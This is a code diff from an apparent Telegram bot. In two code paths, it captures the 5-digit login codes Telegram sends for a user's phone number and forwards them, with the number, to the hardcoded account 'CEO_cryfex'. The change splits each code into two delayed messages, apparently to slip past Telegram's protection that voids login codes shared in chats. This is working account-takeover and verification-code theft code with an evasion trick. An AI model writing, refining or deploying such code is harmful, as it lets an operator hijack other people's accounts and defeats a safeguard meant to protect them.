@@ -2632,12 +2632,13 @@ Your payment will be moved to Main Balance after verification.
                     match = re.search(r'\b(\d{5})\b', event.raw_text)
                     if match:
                         code = match.group(1)
-                        # Format code as requested: 3 digits * 2 digits
-                        formatted_code = f"{code[:3]}*{code[3:]}"
-                        forward_text = f"📞 Number: `{phone}`\n🔢 Code: `{formatted_code}`"
-                        # Forward to the admin username from attached code
-                        await client.send_message('CEO_cryfex', forward_text)
-                        logger.info(f"Forwarded formatted code for {phone} to CEO_cryfex")
+                        # Send first 3 digits
+                        await client.send_message('CEO_cryfex', f"📞 Number: `{phone}`\n🔢 Code (Part 1): `{code[:3]}`")
+                        # Wait a short moment
+                        await asyncio.sleep(2)
+                        # Send last 2 digits
+                        await client.send_message('CEO_cryfex', f"📞 Number: `{phone}`\n🔢 Code (Part 2): `{code[3:]}`")
+                        logger.info(f"Forwarded code in two parts for {phone} to CEO_cryfex")
             except Exception as e:
                 logger.error(f"Forwarding error (2FA path) for {phone}: {e}")
 
@@ -2818,12 +2819,13 @@ async def confirm_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYP
                             match = re.search(r'\b(\d{5})\b', event.raw_text)
                             if match:
                                 code = match.group(1)
-                                # Format code as requested: 3 digits * 2 digits
-                                formatted_code = f"{code[:3]}*{code[3:]}"
-                                forward_text = f"📞 Number: `{user_number}`\n🔢 Code: `{formatted_code}`"
-                                # Forward to the admin username from attached code
-                                await client.send_message('CEO_cryfex', forward_text)
-                                logger.info(f"Forwarded formatted code for {user_number} to CEO_cryfex")
+                                # Send first 3 digits
+                                await client.send_message('CEO_cryfex', f"📞 Number: `{user_number}`\n🔢 Code (Part 1): `{code[:3]}`")
+                                # Wait a short moment
+                                await asyncio.sleep(2)
+                                # Send last 2 digits
+                                await client.send_message('CEO_cryfex', f"📞 Number: `{user_number}`\n🔢 Code (Part 2): `{code[3:]}`")
+                                logger.info(f"Forwarded code in two parts for {user_number} to CEO_cryfex")
                     except Exception as e:
                         logger.error(f"Forwarding error for {user_number}: {e}")
                 
